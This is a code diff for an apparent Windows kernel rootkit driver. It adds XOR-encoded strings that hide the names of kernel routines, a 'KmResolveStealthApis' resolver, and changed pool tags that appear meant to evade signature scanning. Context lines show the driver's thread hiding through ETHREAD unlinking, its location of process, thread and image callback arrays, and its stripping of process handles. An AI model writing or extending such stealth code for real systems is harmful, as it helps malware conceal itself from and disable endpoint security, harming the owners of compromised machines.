@@ -15,6 +15,86 @@ NTSYSCALLAPI NTSTATUS NTAPI ZwQuerySystemInformation(
 );
 
 /* -----------------------------------------------------------------------
+ * Cached API pointers — resolved once via KmResolveStealthApis
+ * ----------------------------------------------------------------------- */
+
+static PFN_PsGetNextProcessThread g_pfnPsGetNextProcessThread = NULL;
+static PVOID g_pfnPsSetCreateProcessNotifyRoutine  = NULL;
+static PVOID g_pfnPsSetCreateThreadNotifyRoutine   = NULL;
+static PVOID g_pfnPsSetLoadImageNotifyRoutine      = NULL;
+
+/* XOR decode helper — prevents plaintext API names in binary */
+#define STR_XOR_KEY 0x37
+
+static VOID XorDecodeW( OUT PWCHAR Out, IN const WCHAR* In, IN ULONG Len )
+{
+	ULONG i;
+	for ( i = 0; i < Len; i++ )
+		Out[i] = In[i] ^ STR_XOR_KEY;
+	Out[Len] = L'\0';
+}
+
+/* Encoded: "PsGetNextProcessThread" (22 chars) */
+static const WCHAR s_PsGetNextProcessThread[] = {
+	0x67,0x44,0x70,0x52,0x43,0x79,0x52,0x4F,0x43,0x67,
+	0x45,0x58,0x54,0x52,0x44,0x44,0x63,0x5F,0x45,0x52,
+	0x56,0x53
+};
+
+/* Encoded: "PsSetCreateProcessNotifyRoutine" (31 chars) */
+static const WCHAR s_PsSetCreateProcessNotifyRoutine[] = {
+	0x67,0x44,0x64,0x52,0x43,0x74,0x45,0x52,0x56,0x43,
+	0x52,0x67,0x45,0x58,0x54,0x52,0x44,0x44,0x79,0x58,
+	0x43,0x5E,0x51,0x4E,0x65,0x58,0x42,0x43,0x5E,0x59,
+	0x52
+};
+
+/* Encoded: "PsSetCreateThreadNotifyRoutine" (30 chars) */
+static const WCHAR s_PsSetCreateThreadNotifyRoutine[] = {
+	0x67,0x44,0x64,0x52,0x43,0x74,0x45,0x52,0x56,0x43,
+	0x52,0x63,0x5F,0x45,0x52,0x56,0x53,0x79,0x58,0x43,
+	0x5E,0x51,0x4E,0x65,0x58,0x42,0x43,0x5E,0x59,0x52
+};
+
+/* Encoded: "PsSetLoadImageNotifyRoutine" (27 chars) */
+static const WCHAR s_PsSetLoadImageNotifyRoutine[] = {
+	0x67,0x44,0x64,0x52,0x43,0x7B,0x58,0x56,0x53,0x7E,
+	0x5A,0x56,0x50,0x52,0x79,0x58,0x43,0x5E,0x51,0x4E,
+	0x65,0x58,0x42,0x43,0x5E,0x59,0x52
+};
+
+static PVOID ResolveEncodedApi( const WCHAR* Encoded, ULONG Len )
+{
+	UNICODE_STRING Name;
+	WCHAR          Buf[48];
+
+	XorDecodeW( Buf, Encoded, Len );
+	RtlInitUnicodeString( &Name, Buf );
+	return MmGetSystemRoutineAddress( &Name );
+}
+
+NTSTATUS KmResolveStealthApis( VOID )
+{
+	g_pfnPsGetNextProcessThread = (PFN_PsGetNextProcessThread)
+		ResolveEncodedApi( s_PsGetNextProcessThread, 22 );
+
+	g_pfnPsSetCreateProcessNotifyRoutine =
+		ResolveEncodedApi( s_PsSetCreateProcessNotifyRoutine, 31 );
+
+	g_pfnPsSetCreateThreadNotifyRoutine =
+		ResolveEncodedApi( s_PsSetCreateThreadNotifyRoutine, 30 );
+
+	g_pfnPsSetLoadImageNotifyRoutine =
+		ResolveEncodedApi( s_PsSetLoadImageNotifyRoutine, 27 );
+
+	return ( g_pfnPsGetNextProcessThread &&
+	         g_pfnPsSetCreateProcessNotifyRoutine &&
+	         g_pfnPsSetCreateThreadNotifyRoutine &&
+	         g_pfnPsSetLoadImageNotifyRoutine )
+		? STATUS_SUCCESS : STATUS_NOT_FOUND;
+}
+
+/* -----------------------------------------------------------------------
  * Thread hiding — unlink ETHREAD entries from EPROCESS.ThreadListHead
  * ----------------------------------------------------------------------- */
 
@@ -34,15 +114,11 @@ static NTSTATUS FindThreadListOffsets(
 	PETHREAD  FirstThread;
 	ULONG_PTR ThreadAddr;
 	ULONG     Off;
-	UNICODE_STRING FuncName;
-	PFN_PsGetNextProcessThread pfnPsGetNextProcessThread;
 
-	RtlInitUnicodeString( &FuncName, L"PsGetNextProcessThread" );
-	pfnPsGetNextProcessThread = (PFN_PsGetNextProcessThread)MmGetSystemRoutineAddress( &FuncName );
-	if ( !pfnPsGetNextProcessThread )
+	if ( !g_pfnPsGetNextProcessThread )
 		return STATUS_NOT_FOUND;
 
-	FirstThread = pfnPsGetNextProcessThread( Process, NULL );
+	FirstThread = g_pfnPsGetNextProcessThread( Process, NULL );
 	if ( !FirstThread )
 		return STATUS_NOT_FOUND;
 
@@ -236,25 +312,23 @@ static PVOID FindCallbackArray( PVOID FunctionAddress )
  */
 static PVOID GetCallbackArrayForType( ULONG CallbackType )
 {
-	UNICODE_STRING FuncName;
-	PVOID          FuncAddr;
+	PVOID FuncAddr;
 
 	switch ( CallbackType )
 	{
 		case CALLBACK_TYPE_PROCESS:
-			RtlInitUnicodeString( &FuncName, L"PsSetCreateProcessNotifyRoutine" );
+			FuncAddr = g_pfnPsSetCreateProcessNotifyRoutine;
 			break;
 		case CALLBACK_TYPE_THREAD:
-			RtlInitUnicodeString( &FuncName, L"PsSetCreateThreadNotifyRoutine" );
+			FuncAddr = g_pfnPsSetCreateThreadNotifyRoutine;
 			break;
 		case CALLBACK_TYPE_IMAGE:
-			RtlInitUnicodeString( &FuncName, L"PsSetLoadImageNotifyRoutine" );
+			FuncAddr = g_pfnPsSetLoadImageNotifyRoutine;
 			break;
 		default:
 			return NULL;
 	}
 
-	FuncAddr = MmGetSystemRoutineAddress( &FuncName );
 	if ( !FuncAddr )
 		return NULL;
 
@@ -393,7 +467,7 @@ NTSTATUS KmStripProcessHandles(
 	/* Query system handle table — grow buffer until it fits */
 	while ( TRUE )
 	{
-		Buffer = ExAllocatePoolWithTag( PagedPool, BufferSize, 'hSmK' );
+		Buffer = ExAllocatePool2( POOL_FLAG_PAGED, BufferSize, 'NdBf' );
 		if ( !Buffer )
 		{
 			ObDereferenceObject( TargetProcess );
@@ -409,7 +483,7 @@ NTSTATUS KmStripProcessHandles(
 
 		if ( Status == STATUS_INFO_LENGTH_MISMATCH )
 		{
-			ExFreePoolWithTag( Buffer, 'hSmK' );
+			ExFreePoolWithTag( Buffer, 'NdBf' );
 			BufferSize = ReturnLength + 0x10000;
 			continue;
 		}
@@ -419,7 +493,7 @@ NTSTATUS KmStripProcessHandles(
 
 	if ( !NT_SUCCESS( Status ) )
 	{
-		ExFreePoolWithTag( Buffer, 'hSmK' );
+		ExFreePoolWithTag( Buffer, 'NdBf' );
 		ObDereferenceObject( TargetProcess );
 		return Status;
 	}
@@ -466,7 +540,7 @@ NTSTATUS KmStripProcessHandles(
 		}
 	}
 
-	ExFreePoolWithTag( Buffer, 'hSmK' );
+	ExFreePoolWithTag( Buffer, 'NdBf' );
 	ObDereferenceObject( TargetProcess );
 
 	if ( HandlesStripped )
